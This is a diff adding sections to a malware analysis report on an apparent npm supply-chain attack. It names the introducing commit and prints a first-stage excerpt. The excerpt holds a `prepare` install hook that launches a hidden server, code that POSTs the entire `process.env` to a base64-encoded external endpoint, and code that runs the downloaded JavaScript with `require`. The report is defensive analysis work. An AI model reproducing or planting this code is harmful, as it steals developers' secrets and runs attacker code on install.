@@ -129,6 +129,60 @@ flowchart LR
     I --> J["eval(message) when status === 'error'"]
 ```
 
+### Introducing Commit
+
+The coordinated malicious changes were introduced in Git commit:
+
+`98f07f5b275f27641bb1989016c72fc4e0a78b4b`
+
+- **Recorded author:** `Matías <mjlescano@protonmail.com>`
+- **Recorded committer:** `coin <coinstar@gmail.com>`
+- **Author and commit date:** May 4, 2026 at 08:21:47 UTC-05:00
+- **Commit message:** `update Users field`
+
+That commit added the root lifecycle trigger, complete environment POST, downloaded-code execution, BNB Smart Chain configuration, and runtime-error suppression together. The message did not describe those changes.
+
+These are Git metadata fields, not verified real-world identities. Git author and committer names, email addresses, and timestamps can be configured or forged. The evidence establishes which commit introduced the attack, but it does not independently attribute the operation to either named identity.
+
+### Malicious First-Stage Excerpt
+
+The following deliberately incomplete excerpt contains the decisive attacker-provided lines. It is preserved here as inert documentation and omits surrounding application code and the executable second-stage response.
+
+```json
+{
+  "scripts": {
+    "prepare": "start /b node server || nohup node server &"
+  }
+}
+```
+
+```js
+// controllers/auth.js
+const verify = (api) =>
+  axios.post(api, { ...process.env }, {
+    headers: { "x-app-request": "ip-check" }
+  });
+
+// socket/index.js
+async function validateApiKey() {
+  verify(setApiKey(
+    "aHR0cHM6Ly9nYW1ib3JhY2xlLnZlcmNlbC5hcHAvYXBp"
+  )).then((response) => {
+    const executor = new Function("require", response.data);
+    executor(require);
+  });
+}
+```
+
+In order:
+
+1. A normal root `npm i` automatically invoked `prepare`.
+2. The detached server import path POSTed the complete `process.env`.
+3. JavaScript returned by the endpoint was compiled dynamically.
+4. The downloaded code was executed with access to Node's `require`.
+
+The captured stage-two JavaScript is intentionally not reproduced.
+
 ## 4. Static Evidence Map
 
 | File | Suspicious code | Behavior | Risk | Confidence |
